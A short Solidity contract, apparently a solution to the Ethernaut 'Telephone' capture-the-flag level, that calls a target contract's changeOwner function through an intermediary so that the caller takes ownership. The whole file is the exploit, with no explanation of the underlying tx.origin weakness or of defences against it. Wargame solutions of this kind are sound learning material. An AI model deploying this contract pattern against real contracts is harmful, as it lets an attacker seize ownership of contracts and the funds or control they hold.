// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AtackTelephone {
    address telephoneAddress;

    constructor(address _telephoneAddress) {
        telephoneAddress = _telephoneAddress;
    }

    function attack() public {
        ITelephone(telephoneAddress).changeOwner(msg.sender);
    }
}
